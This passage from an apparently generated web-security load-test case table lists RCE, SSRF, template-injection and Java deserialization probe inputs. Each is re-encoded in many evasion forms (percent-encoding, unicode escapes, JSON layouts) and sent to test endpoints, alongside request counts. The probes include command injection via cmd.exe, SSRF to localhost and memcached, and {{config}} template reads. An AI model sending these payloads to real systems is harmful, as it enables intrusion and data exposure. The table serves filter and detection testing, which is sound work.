| ` rce/variant-03320 ` | ` rce/syntax-0123 ` | ` form-lower-hex ` | POST | ` /api/loadtest/rce ` | ` %69%6e%70%75%74=%63%6d%64%2e%65%78%65%20%2f%63%20%65%63%68%6f%20%4c%4f%41%44%54%45%53%54 ` | 97 |
| ` rce/variant-03321 ` | ` rce/syntax-0123 ` | ` form-percent-space ` | POST | ` /api/loadtest/rce ` | ` input=cmd.exe%20%2Fc%20echo%20LOADTEST ` | 97 |
| ` rce/variant-03322 ` | ` rce/syntax-0124 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/rce ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0065\u0063\u0068\u006f\u0020\u004c\u004f\u0041\u0044\u0054\u0045\u0053\u0054"} ` | 97 |
| ` rce/variant-03323 ` | ` rce/syntax-0124 ` | ` json-layout-20 ` | POST | ` /api/loadtest/rce ` | ` {\n "input": "cmd.exe /c echo LOADTEST"\n} ` | 97 |
| ` rce/variant-03324 ` | ` rce/syntax-0124 ` | ` json-layout-09 ` | POST | ` /api/loadtest/rce ` | ` {\n\t"input": "cmd.exe /c echo LOADTEST"\n} ` | 97 |

## SSRF inputs

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` ssrf/148 ` | (original) | (original) | GET | ` /?url=http://0x7f000001/ ` | (empty) | 98 |
| ` ssrf/150 ` | (original) | (original) | GET | ` /?src=dict://127.0.0.1:11211/stats ` | (empty) | 98 |
| ` ssrf/syntax-0188 ` | ` ssrf/syntax-family ` | ` syntax-03-query ` | GET | ` /api/loadtest/ssrf?input=http%3A%2F%2F0x7f000001%2F ` | (empty) | 98 |
| ` ssrf/syntax-0189 ` | ` ssrf/syntax-family ` | ` syntax-03-form ` | POST | ` /api/loadtest/ssrf ` | ` input=http%3A%2F%2F0x7f000001%2F ` | 98 |
| ` ssrf/syntax-0190 ` | ` ssrf/syntax-family ` | ` syntax-03-json ` | POST | ` /api/loadtest/ssrf ` | ` {"input":"http://0x7f000001/"} ` | 98 |
| ` ssrf/syntax-0194 ` | ` ssrf/syntax-family ` | ` syntax-05-query ` | GET | ` /api/loadtest/ssrf?input=http%3A%2F%2Fexample.com%40127.0.0.1%2F ` | (empty) | 98 |
| ` ssrf/syntax-0195 ` | ` ssrf/syntax-family ` | ` syntax-05-form ` | POST | ` /api/loadtest/ssrf ` | ` input=http%3A%2F%2Fexample.com%40127.0.0.1%2F ` | 98 |
| ` ssrf/syntax-0196 ` | ` ssrf/syntax-family ` | ` syntax-05-json ` | POST | ` /api/loadtest/ssrf ` | ` {"input":"http://example.com@127.0.0.1/"} ` | 98 |
| ` ssrf/syntax-0200 ` | ` ssrf/syntax-family ` | ` syntax-07-query ` | GET | ` /api/loadtest/ssrf?input=dict%3A%2F%2F127.0.0.1%3A11211%2Fstats ` | (empty) | 98 |
| ` ssrf/syntax-0201 ` | ` ssrf/syntax-family ` | ` syntax-07-form ` | POST | ` /api/loadtest/ssrf ` | ` input=dict%3A%2F%2F127.0.0.1%3A11211%2Fstats ` | 98 |
| ` ssrf/syntax-0202 ` | ` ssrf/syntax-family ` | ` syntax-07-json ` | POST | ` /api/loadtest/ssrf ` | ` {"input":"dict://127.0.0.1:11211/stats"} ` | 98 |
| ` ssrf/variant-01676 ` | ` ssrf/148 ` | ` query-encoded-name ` | GET | ` /?%75%72%6C=http://0x7f000001/ ` | (empty) | 98 |
| ` ssrf/variant-01677 ` | ` ssrf/148 ` | ` query-encoded-value ` | GET | ` /?url=%68%74%74%70%3A%2F%2F%30%78%37%66%30%30%30%30%30%31%2F ` | (empty) | 98 |
| ` ssrf/variant-01678 ` | ` ssrf/148 ` | ` query-encoded-both ` | GET | ` /?%75%72%6C=%68%74%74%70%3A%2F%2F%30%78%37%66%30%30%30%30%30%31%2F ` | (empty) | 98 |
| ` ssrf/variant-01679 ` | ` ssrf/148 ` | ` query-lower-hex ` | GET | ` /?%75%72%6c=%68%74%74%70%3a%2f%2f%30%78%37%66%30%30%30%30%30%31%2f ` | (empty) | 98 |
| ` ssrf/variant-01680 ` | ` ssrf/148 ` | ` query-percent-space ` | GET | ` /?url=http%3A%2F%2F0x7f000001%2F ` | (empty) | 98 |
| ` ssrf/variant-01686 ` | ` ssrf/150 ` | ` query-encoded-name ` | GET | ` /?%73%72%63=dict://127.0.0.1:11211/stats ` | (empty) | 98 |
| ` ssrf/variant-01687 ` | ` ssrf/150 ` | ` query-encoded-value ` | GET | ` /?src=%64%69%63%74%3A%2F%2F%31%32%37%2E%30%2E%30%2E%31%3A%31%31%32%31%31%2F%73%74%61%74%73 ` | (empty) | 98 |
| ` ssrf/variant-01688 ` | ` ssrf/150 ` | ` query-encoded-both ` | GET | ` /?%73%72%63=%64%69%63%74%3A%2F%2F%31%32%37%2E%30%2E%30%2E%31%3A%31%31%32%31%31%2F%73%74%61%74%73 ` | (empty) | 98 |
| ` ssrf/variant-01689 ` | ` ssrf/150 ` | ` query-lower-hex ` | GET | ` /?%73%72%63=%64%69%63%74%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%31%31%32%31%31%2f%73%74%61%74%73 ` | (empty) | 98 |
| ` ssrf/variant-01690 ` | ` ssrf/150 ` | ` query-percent-space ` | GET | ` /?src=dict%3A%2F%2F127.0.0.1%3A11211%2Fstats ` | (empty) | 98 |
| ` ssrf/variant-03570 ` | ` ssrf/syntax-0188 ` | ` query-encoded-name ` | GET | ` /api/loadtest/ssrf?%69%6E%70%75%74=http%3A%2F%2F0x7f000001%2F ` | (empty) | 97 |
| ` ssrf/variant-03571 ` | ` ssrf/syntax-0188 ` | ` query-encoded-value ` | GET | ` /api/loadtest/ssrf?input=%68%74%74%70%3A%2F%2F%30%78%37%66%30%30%30%30%30%31%2F ` | (empty) | 97 |
| ` ssrf/variant-03572 ` | ` ssrf/syntax-0188 ` | ` query-encoded-both ` | GET | ` /api/loadtest/ssrf?%69%6E%70%75%74=%68%74%74%70%3A%2F%2F%30%78%37%66%30%30%30%30%30%31%2F ` | (empty) | 97 |
| ` ssrf/variant-03573 ` | ` ssrf/syntax-0188 ` | ` query-lower-hex ` | GET | ` /api/loadtest/ssrf?%69%6e%70%75%74=%68%74%74%70%3a%2f%2f%30%78%37%66%30%30%30%30%30%31%2f ` | (empty) | 97 |
| ` ssrf/variant-03574 ` | ` ssrf/syntax-0189 ` | ` form-encoded-name ` | POST | ` /api/loadtest/ssrf ` | ` %69%6E%70%75%74=http%3A%2F%2F0x7f000001%2F ` | 97 |
| ` ssrf/variant-03575 ` | ` ssrf/syntax-0189 ` | ` form-encoded-value ` | POST | ` /api/loadtest/ssrf ` | ` input=%68%74%74%70%3A%2F%2F%30%78%37%66%30%30%30%30%30%31%2F ` | 97 |
| ` ssrf/variant-03576 ` | ` ssrf/syntax-0189 ` | ` form-encoded-both ` | POST | ` /api/loadtest/ssrf ` | ` %69%6E%70%75%74=%68%74%74%70%3A%2F%2F%30%78%37%66%30%30%30%30%30%31%2F ` | 97 |
| ` ssrf/variant-03577 ` | ` ssrf/syntax-0189 ` | ` form-lower-hex ` | POST | ` /api/loadtest/ssrf ` | ` %69%6e%70%75%74=%68%74%74%70%3a%2f%2f%30%78%37%66%30%30%30%30%30%31%2f ` | 97 |
| ` ssrf/variant-03578 ` | ` ssrf/syntax-0190 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/ssrf ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0030\u0078\u0037\u0066\u0030\u0030\u0030\u0030\u0030\u0031\u002f"} ` | 97 |
| ` ssrf/variant-03579 ` | ` ssrf/syntax-0190 ` | ` json-layout-20 ` | POST | ` /api/loadtest/ssrf ` | ` {\n "input": "http://0x7f000001/"\n} ` | 97 |
| ` ssrf/variant-03580 ` | ` ssrf/syntax-0190 ` | ` json-layout-09 ` | POST | ` /api/loadtest/ssrf ` | ` {\n\t"input": "http://0x7f000001/"\n} ` | 97 |
| ` ssrf/variant-03592 ` | ` ssrf/syntax-0194 ` | ` query-encoded-name ` | GET | ` /api/loadtest/ssrf?%69%6E%70%75%74=http%3A%2F%2Fexample.com%40127.0.0.1%2F ` | (empty) | 97 |
| ` ssrf/variant-03593 ` | ` ssrf/syntax-0194 ` | ` query-encoded-value ` | GET | ` /api/loadtest/ssrf?input=%68%74%74%70%3A%2F%2F%65%78%61%6D%70%6C%65%2E%63%6F%6D%40%31%32%37%2E%30%2E%30%2E%31%2F ` | (empty) | 97 |
| ` ssrf/variant-03594 ` | ` ssrf/syntax-0194 ` | ` query-encoded-both ` | GET | ` /api/loadtest/ssrf?%69%6E%70%75%74=%68%74%74%70%3A%2F%2F%65%78%61%6D%70%6C%65%2E%63%6F%6D%40%31%32%37%2E%30%2E%30%2E%31%2F ` | (empty) | 97 |
| ` ssrf/variant-03595 ` | ` ssrf/syntax-0194 ` | ` query-lower-hex ` | GET | ` /api/loadtest/ssrf?%69%6e%70%75%74=%68%74%74%70%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%40%31%32%37%2e%30%2e%30%2e%31%2f ` | (empty) | 97 |
| ` ssrf/variant-03596 ` | ` ssrf/syntax-0195 ` | ` form-encoded-name ` | POST | ` /api/loadtest/ssrf ` | ` %69%6E%70%75%74=http%3A%2F%2Fexample.com%40127.0.0.1%2F ` | 97 |
| ` ssrf/variant-03597 ` | ` ssrf/syntax-0195 ` | ` form-encoded-value ` | POST | ` /api/loadtest/ssrf ` | ` input=%68%74%74%70%3A%2F%2F%65%78%61%6D%70%6C%65%2E%63%6F%6D%40%31%32%37%2E%30%2E%30%2E%31%2F ` | 97 |
| ` ssrf/variant-03598 ` | ` ssrf/syntax-0195 ` | ` form-encoded-both ` | POST | ` /api/loadtest/ssrf ` | ` %69%6E%70%75%74=%68%74%74%70%3A%2F%2F%65%78%61%6D%70%6C%65%2E%63%6F%6D%40%31%32%37%2E%30%2E%30%2E%31%2F ` | 97 |
| ` ssrf/variant-03599 ` | ` ssrf/syntax-0195 ` | ` form-lower-hex ` | POST | ` /api/loadtest/ssrf ` | ` %69%6e%70%75%74=%68%74%74%70%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%40%31%32%37%2e%30%2e%30%2e%31%2f ` | 97 |
| ` ssrf/variant-03600 ` | ` ssrf/syntax-0196 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/ssrf ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u002e\u0063\u006f\u006d\u0040\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u002f"} ` | 97 |
| ` ssrf/variant-03601 ` | ` ssrf/syntax-0196 ` | ` json-layout-20 ` | POST | ` /api/loadtest/ssrf ` | ` {\n "input": "http://example.com@127.0.0.1/"\n} ` | 97 |
| ` ssrf/variant-03602 ` | ` ssrf/syntax-0196 ` | ` json-layout-09 ` | POST | ` /api/loadtest/ssrf ` | ` {\n\t"input": "http://example.com@127.0.0.1/"\n} ` | 97 |
| ` ssrf/variant-03614 ` | ` ssrf/syntax-0200 ` | ` query-encoded-name ` | GET | ` /api/loadtest/ssrf?%69%6E%70%75%74=dict%3A%2F%2F127.0.0.1%3A11211%2Fstats ` | (empty) | 97 |
| ` ssrf/variant-03615 ` | ` ssrf/syntax-0200 ` | ` query-encoded-value ` | GET | ` /api/loadtest/ssrf?input=%64%69%63%74%3A%2F%2F%31%32%37%2E%30%2E%30%2E%31%3A%31%31%32%31%31%2F%73%74%61%74%73 ` | (empty) | 97 |
| ` ssrf/variant-03616 ` | ` ssrf/syntax-0200 ` | ` query-encoded-both ` | GET | ` /api/loadtest/ssrf?%69%6E%70%75%74=%64%69%63%74%3A%2F%2F%31%32%37%2E%30%2E%30%2E%31%3A%31%31%32%31%31%2F%73%74%61%74%73 ` | (empty) | 97 |
| ` ssrf/variant-03617 ` | ` ssrf/syntax-0200 ` | ` query-lower-hex ` | GET | ` /api/loadtest/ssrf?%69%6e%70%75%74=%64%69%63%74%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%31%31%32%31%31%2f%73%74%61%74%73 ` | (empty) | 97 |
| ` ssrf/variant-03618 ` | ` ssrf/syntax-0201 ` | ` form-encoded-name ` | POST | ` /api/loadtest/ssrf ` | ` %69%6E%70%75%74=dict%3A%2F%2F127.0.0.1%3A11211%2Fstats ` | 97 |
| ` ssrf/variant-03619 ` | ` ssrf/syntax-0201 ` | ` form-encoded-value ` | POST | ` /api/loadtest/ssrf ` | ` input=%64%69%63%74%3A%2F%2F%31%32%37%2E%30%2E%30%2E%31%3A%31%31%32%31%31%2F%73%74%61%74%73 ` | 97 |
| ` ssrf/variant-03620 ` | ` ssrf/syntax-0201 ` | ` form-encoded-both ` | POST | ` /api/loadtest/ssrf ` | ` %69%6E%70%75%74=%64%69%63%74%3A%2F%2F%31%32%37%2E%30%2E%30%2E%31%3A%31%31%32%31%31%2F%73%74%61%74%73 ` | 97 |
| ` ssrf/variant-03621 ` | ` ssrf/syntax-0201 ` | ` form-lower-hex ` | POST | ` /api/loadtest/ssrf ` | ` %69%6e%70%75%74=%64%69%63%74%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%31%31%32%31%31%2f%73%74%61%74%73 ` | 97 |
| ` ssrf/variant-03622 ` | ` ssrf/syntax-0202 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/ssrf ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0064\u0069\u0063\u0074\u003a\u002f\u002f\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031\u003a\u0031\u0031\u0032\u0031\u0031\u002f\u0073\u0074\u0061\u0074\u0073"} ` | 97 |
| ` ssrf/variant-03623 ` | ` ssrf/syntax-0202 ` | ` json-layout-20 ` | POST | ` /api/loadtest/ssrf ` | ` {\n "input": "dict://127.0.0.1:11211/stats"\n} ` | 97 |
| ` ssrf/variant-03624 ` | ` ssrf/syntax-0202 ` | ` json-layout-09 ` | POST | ` /api/loadtest/ssrf ` | ` {\n\t"input": "dict://127.0.0.1:11211/stats"\n} ` | 97 |

## Template injection

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` ssti/156 ` | (original) | (original) | GET | ` /?name=%7B%7Bconfig%7D%7D ` | (empty) | 98 |
| ` ssti/164 ` | (original) | (original) | GET | ` /?name=*%7B7*7%7D ` | (empty) | 98 |
| ` ssti/syntax-0226 ` | ` ssti/syntax-family ` | ` syntax-07-query ` | GET | ` /api/loadtest/ssti?input=%2A%7B7%2A7%7D ` | (empty) | 98 |
| ` ssti/syntax-0227 ` | ` ssti/syntax-family ` | ` syntax-07-form ` | POST | ` /api/loadtest/ssti ` | ` input=%2A%7B7%2A7%7D ` | 98 |
| ` ssti/syntax-0228 ` | ` ssti/syntax-family ` | ` syntax-07-json ` | POST | ` /api/loadtest/ssti ` | ` {"input":"*{7*7}"} ` | 98 |
| ` ssti/syntax-0229 ` | ` ssti/syntax-family ` | ` syntax-08-query ` | GET | ` /api/loadtest/ssti?input=%7B%7Bconfig%7D%7D ` | (empty) | 98 |
| ` ssti/syntax-0230 ` | ` ssti/syntax-family ` | ` syntax-08-form ` | POST | ` /api/loadtest/ssti ` | ` input=%7B%7Bconfig%7D%7D ` | 98 |
| ` ssti/syntax-0231 ` | ` ssti/syntax-family ` | ` syntax-08-json ` | POST | ` /api/loadtest/ssti ` | ` {"input":"{{config}}"} ` | 98 |
| ` ssti/variant-01716 ` | ` ssti/156 ` | ` query-encoded-name ` | GET | ` /?%6E%61%6D%65=%7B%7Bconfig%7D%7D ` | (empty) | 98 |
| ` ssti/variant-01717 ` | ` ssti/156 ` | ` query-encoded-value ` | GET | ` /?name=%7B%7B%63%6F%6E%66%69%67%7D%7D ` | (empty) | 98 |
| ` ssti/variant-01718 ` | ` ssti/156 ` | ` query-encoded-both ` | GET | ` /?%6E%61%6D%65=%7B%7B%63%6F%6E%66%69%67%7D%7D ` | (empty) | 98 |
| ` ssti/variant-01719 ` | ` ssti/156 ` | ` query-lower-hex ` | GET | ` /?%6e%61%6d%65=%7b%7b%63%6f%6e%66%69%67%7d%7d ` | (empty) | 98 |
| ` ssti/variant-01745 ` | ` ssti/164 ` | ` query-encoded-name ` | GET | ` /?%6E%61%6D%65=*%7B7*7%7D ` | (empty) | 98 |
| ` ssti/variant-01746 ` | ` ssti/164 ` | ` query-encoded-value ` | GET | ` /?name=%2A%7B%37%2A%37%7D ` | (empty) | 98 |
| ` ssti/variant-01747 ` | ` ssti/164 ` | ` query-encoded-both ` | GET | ` /?%6E%61%6D%65=%2A%7B%37%2A%37%7D ` | (empty) | 98 |
| ` ssti/variant-01748 ` | ` ssti/164 ` | ` query-lower-hex ` | GET | ` /?%6e%61%6d%65=%2a%7b%37%2a%37%7d ` | (empty) | 98 |
| ` ssti/variant-01749 ` | ` ssti/164 ` | ` query-percent-space ` | GET | ` /?name=%2A%7B7%2A7%7D ` | (empty) | 98 |
| ` ssti/variant-03716 ` | ` ssti/syntax-0226 ` | ` query-encoded-name ` | GET | ` /api/loadtest/ssti?%69%6E%70%75%74=%2A%7B7%2A7%7D ` | (empty) | 97 |
| ` ssti/variant-03717 ` | ` ssti/syntax-0226 ` | ` query-encoded-value ` | GET | ` /api/loadtest/ssti?input=%2A%7B%37%2A%37%7D ` | (empty) | 97 |
| ` ssti/variant-03718 ` | ` ssti/syntax-0226 ` | ` query-encoded-both ` | GET | ` /api/loadtest/ssti?%69%6E%70%75%74=%2A%7B%37%2A%37%7D ` | (empty) | 97 |
| ` ssti/variant-03719 ` | ` ssti/syntax-0226 ` | ` query-lower-hex ` | GET | ` /api/loadtest/ssti?%69%6e%70%75%74=%2a%7b%37%2a%37%7d ` | (empty) | 97 |
| ` ssti/variant-03720 ` | ` ssti/syntax-0227 ` | ` form-encoded-name ` | POST | ` /api/loadtest/ssti ` | ` %69%6E%70%75%74=%2A%7B7%2A7%7D ` | 97 |
| ` ssti/variant-03721 ` | ` ssti/syntax-0227 ` | ` form-encoded-value ` | POST | ` /api/loadtest/ssti ` | ` input=%2A%7B%37%2A%37%7D ` | 97 |
| ` ssti/variant-03722 ` | ` ssti/syntax-0227 ` | ` form-encoded-both ` | POST | ` /api/loadtest/ssti ` | ` %69%6E%70%75%74=%2A%7B%37%2A%37%7D ` | 97 |
| ` ssti/variant-03723 ` | ` ssti/syntax-0227 ` | ` form-lower-hex ` | POST | ` /api/loadtest/ssti ` | ` %69%6e%70%75%74=%2a%7b%37%2a%37%7d ` | 97 |
| ` ssti/variant-03724 ` | ` ssti/syntax-0228 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/ssti ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u002a\u007b\u0037\u002a\u0037\u007d"} ` | 97 |
| ` ssti/variant-03725 ` | ` ssti/syntax-0228 ` | ` json-layout-20 ` | POST | ` /api/loadtest/ssti ` | ` {\n "input": "*{7*7}"\n} ` | 97 |
| ` ssti/variant-03726 ` | ` ssti/syntax-0228 ` | ` json-layout-09 ` | POST | ` /api/loadtest/ssti ` | ` {\n\t"input": "*{7*7}"\n} ` | 97 |
| ` ssti/variant-03727 ` | ` ssti/syntax-0229 ` | ` query-encoded-name ` | GET | ` /api/loadtest/ssti?%69%6E%70%75%74=%7B%7Bconfig%7D%7D ` | (empty) | 97 |
| ` ssti/variant-03728 ` | ` ssti/syntax-0229 ` | ` query-encoded-value ` | GET | ` /api/loadtest/ssti?input=%7B%7B%63%6F%6E%66%69%67%7D%7D ` | (empty) | 97 |
| ` ssti/variant-03729 ` | ` ssti/syntax-0229 ` | ` query-encoded-both ` | GET | ` /api/loadtest/ssti?%69%6E%70%75%74=%7B%7B%63%6F%6E%66%69%67%7D%7D ` | (empty) | 97 |
| ` ssti/variant-03730 ` | ` ssti/syntax-0229 ` | ` query-lower-hex ` | GET | ` /api/loadtest/ssti?%69%6e%70%75%74=%7b%7b%63%6f%6e%66%69%67%7d%7d ` | (empty) | 97 |
| ` ssti/variant-03731 ` | ` ssti/syntax-0230 ` | ` form-encoded-name ` | POST | ` /api/loadtest/ssti ` | ` %69%6E%70%75%74=%7B%7Bconfig%7D%7D ` | 97 |
| ` ssti/variant-03732 ` | ` ssti/syntax-0230 ` | ` form-encoded-value ` | POST | ` /api/loadtest/ssti ` | ` input=%7B%7B%63%6F%6E%66%69%67%7D%7D ` | 97 |
| ` ssti/variant-03733 ` | ` ssti/syntax-0230 ` | ` form-encoded-both ` | POST | ` /api/loadtest/ssti ` | ` %69%6E%70%75%74=%7B%7B%63%6F%6E%66%69%67%7D%7D ` | 97 |
| ` ssti/variant-03734 ` | ` ssti/syntax-0230 ` | ` form-lower-hex ` | POST | ` /api/loadtest/ssti ` | ` %69%6e%70%75%74=%7b%7b%63%6f%6e%66%69%67%7d%7d ` | 97 |
| ` ssti/variant-03735 ` | ` ssti/syntax-0231 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/ssti ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u007b\u007b\u0063\u006f\u006e\u0066\u0069\u0067\u007d\u007d"} ` | 97 |
| ` ssti/variant-03736 ` | ` ssti/syntax-0231 ` | ` json-layout-20 ` | POST | ` /api/loadtest/ssti ` | ` {\n "input": "{{config}}"\n} ` | 97 |
| ` ssti/variant-03737 ` | ` ssti/syntax-0231 ` | ` json-layout-09 ` | POST | ` /api/loadtest/ssti ` | ` {\n\t"input": "{{config}}"\n} ` | 97 |

## Java attack indicators

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` java/134 ` | (original) | (original) | GET | ` /?x=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH ` | (empty) | 98 |
| ` java/135 ` | (original) | (original) | GET | ` /?x=aced00057372 ` | (empty) | 98 |
| ` java/syntax-0171 ` | ` java/syntax-family ` | ` syntax-05-query ` | GET | ` /api/loadtest/java?input=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH ` | (empty) | 98 |
| ` java/syntax-0172 ` | ` java/syntax-family ` | ` syntax-05-form ` | POST | ` /api/loadtest/java ` | ` input=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH ` | 98 |
| ` java/syntax-0173 ` | ` java/syntax-family ` | ` syntax-05-json ` | POST | ` /api/loadtest/java ` | ` {"input":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH"} ` | 98 |
| ` java/syntax-0174 ` | ` java/syntax-family ` | ` syntax-06-query ` | GET | ` /api/loadtest/java?input=aced00057372 ` | (empty) | 98 |
| ` java/syntax-0175 ` | ` java/syntax-family ` | ` syntax-06-form ` | POST | ` /api/loadtest/java ` | ` input=aced00057372 ` | 98 |
| ` java/syntax-0176 ` | ` java/syntax-family ` | ` syntax-06-json ` | POST | ` /api/loadtest/java ` | ` {"input":"aced00057372"} ` | 98 |
| ` java/variant-01629 ` | ` java/134 ` | ` query-encoded-name ` | GET | ` /?%78=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH ` | (empty) | 98 |
| ` java/variant-01630 ` | ` java/134 ` | ` query-encoded-value ` | GET | ` /?x=%72%4F%30%41%42%58%4E%79%41%42%46%71%59%58%5A%68%4C%6E%56%30%61%57%77%75%53%47%46%7A%61%45%31%68%63%41%55%48 ` | (empty) | 98 |
| ` java/variant-01631 ` | ` java/134 ` | ` query-encoded-both ` | GET | ` /?%78=%72%4F%30%41%42%58%4E%79%41%42%46%71%59%58%5A%68%4C%6E%56%30%61%57%77%75%53%47%46%7A%61%45%31%68%63%41%55%48 ` | (empty) | 98 |
| ` java/variant-01632 ` | ` java/134 ` | ` query-lower-hex ` | GET | ` /?%78=%72%4f%30%41%42%58%4e%79%41%42%46%71%59%58%5a%68%4c%6e%56%30%61%57%77%75%53%47%46%7a%61%45%31%68%63%41%55%48 ` | (empty) | 98 |
| ` java/variant-01633 ` | ` java/135 ` | ` query-encoded-name ` | GET | ` /?%78=aced00057372 ` | (empty) | 98 |
| ` java/variant-01634 ` | ` java/135 ` | ` query-encoded-value ` | GET | ` /?x=%61%63%65%64%30%30%30%35%37%33%37%32 ` | (empty) | 98 |
| ` java/variant-01635 ` | ` java/135 ` | ` query-encoded-both ` | GET | ` /?%78=%61%63%65%64%30%30%30%35%37%33%37%32 ` | (empty) | 98 |
| ` java/variant-03507 ` | ` java/syntax-0171 ` | ` query-encoded-name ` | GET | ` /api/loadtest/java?%69%6E%70%75%74=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH ` | (empty) | 97 |
| ` java/variant-03508 ` | ` java/syntax-0171 ` | ` query-encoded-value ` | GET | ` /api/loadtest/java?input=%72%4F%30%41%42%58%4E%79%41%42%46%71%59%58%5A%68%4C%6E%56%30%61%57%77%75%53%47%46%7A%61%45%31%68%63%41%55%48 ` | (empty) | 97 |
| ` java/variant-03509 ` | ` java/syntax-0171 ` | ` query-encoded-both ` | GET | ` /api/loadtest/java?%69%6E%70%75%74=%72%4F%30%41%42%58%4E%79%41%42%46%71%59%58%5A%68%4C%6E%56%30%61%57%77%75%53%47%46%7A%61%45%31%68%63%41%55%48 ` | (empty) | 97 |
| ` java/variant-03510 ` | ` java/syntax-0171 ` | ` query-lower-hex ` | GET | ` /api/loadtest/java?%69%6e%70%75%74=%72%4f%30%41%42%58%4e%79%41%42%46%71%59%58%5a%68%4c%6e%56%30%61%57%77%75%53%47%46%7a%61%45%31%68%63%41%55%48 ` | (empty) | 97 |
| ` java/variant-03511 ` | ` java/syntax-0172 ` | ` form-encoded-name ` | POST | ` /api/loadtest/java ` | ` %69%6E%70%75%74=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH ` | 97 |
| ` java/variant-03512 ` | ` java/syntax-0172 ` | ` form-encoded-value ` | POST | ` /api/loadtest/java ` | ` input=%72%4F%30%41%42%58%4E%79%41%42%46%71%59%58%5A%68%4C%6E%56%30%61%57%77%75%53%47%46%7A%61%45%31%68%63%41%55%48 ` | 97 |
| ` java/variant-03513 ` | ` java/syntax-0172 ` | ` form-encoded-both ` | POST | ` /api/loadtest/java ` | ` %69%6E%70%75%74=%72%4F%30%41%42%58%4E%79%41%42%46%71%59%58%5A%68%4C%6E%56%30%61%57%77%75%53%47%46%7A%61%45%31%68%63%41%55%48 ` | 97 |
| ` java/variant-03514 ` | ` java/syntax-0172 ` | ` form-lower-hex ` | POST | ` /api/loadtest/java ` | ` %69%6e%70%75%74=%72%4f%30%41%42%58%4e%79%41%42%46%71%59%58%5a%68%4c%6e%56%30%61%57%77%75%53%47%46%7a%61%45%31%68%63%41%55%48 ` | 97 |
| ` java/variant-03515 ` | ` java/syntax-0173 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/java ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0072\u004f\u0030\u0041\u0042\u0058\u004e\u0079\u0041\u0042\u0046\u0071\u0059\u0058\u005a\u0068\u004c\u006e\u0056\u0030\u0061\u0057\u0077\u0075\u0053\u0047\u0046\u007a\u0061\u0045\u0031\u0068\u0063\u0041\u0055\u0048"} ` | 97 |
| ` java/variant-03516 ` | ` java/syntax-0173 ` | ` json-layout-20 ` | POST | ` /api/loadtest/java ` | ` {\n "input": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH"\n} ` | 97 |
| ` java/variant-03517 ` | ` java/syntax-0173 ` | ` json-layout-09 ` | POST | ` /api/loadtest/java ` | ` {\n\t"input": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH"\n} ` | 97 |
| ` java/variant-03518 ` | ` java/syntax-0174 ` | ` query-encoded-name ` | GET | ` /api/loadtest/java?%69%6E%70%75%74=aced00057372 ` | (empty) | 97 |
| ` java/variant-03519 ` | ` java/syntax-0174 ` | ` query-encoded-value ` | GET | ` /api/loadtest/java?input=%61%63%65%64%30%30%30%35%37%33%37%32 ` | (empty) | 97 |
| ` java/variant-03520 ` | ` java/syntax-0174 ` | ` query-encoded-both ` | GET | ` /api/loadtest/java?%69%6E%70%75%74=%61%63%65%64%30%30%30%35%37%33%37%32 ` | (empty) | 97 |
| ` java/variant-03521 ` | ` java/syntax-0174 ` | ` query-lower-hex ` | GET | ` /api/loadtest/java?%69%6e%70%75%74=%61%63%65%64%30%30%30%35%37%33%37%32 ` | (empty) | 97 |
| ` java/variant-03522 ` | ` java/syntax-0175 ` | ` form-encoded-name ` | POST | ` /api/loadtest/java ` | ` %69%6E%70%75%74=aced00057372 ` | 97 |
| ` java/variant-03523 ` | ` java/syntax-0175 ` | ` form-encoded-value ` | POST | ` /api/loadtest/java ` | ` input=%61%63%65%64%30%30%30%35%37%33%37%32 ` | 97 |
| ` java/variant-03524 ` | ` java/syntax-0175 ` | ` form-encoded-both ` | POST | ` /api/loadtest/java ` | ` %69%6E%70%75%74=%61%63%65%64%30%30%30%35%37%33%37%32 ` | 97 |
| ` java/variant-03525 ` | ` java/syntax-0175 ` | ` form-lower-hex ` | POST | ` /api/loadtest/java ` | ` %69%6e%70%75%74=%61%63%65%64%30%30%30%35%37%33%37%32 ` | 97 |
| ` java/variant-03526 ` | ` java/syntax-0176 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/java ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0061\u0063\u0065\u0064\u0030\u0030\u0030\u0035\u0037\u0033\u0037\u0032"} ` | 97 |
